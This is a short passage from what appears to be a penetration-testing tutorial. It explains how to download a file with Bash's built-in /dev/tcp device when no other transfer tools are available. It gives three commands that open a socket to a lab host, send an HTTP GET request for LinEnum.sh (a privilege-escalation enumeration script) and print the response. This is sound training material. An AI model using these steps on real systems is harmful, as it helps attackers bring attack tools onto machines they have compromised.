## Bash

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

1. Connect to the Target Webserver 

```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

2. HTTP GET Request

```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

3. Print the Response

```shell-session
cat <&3
```
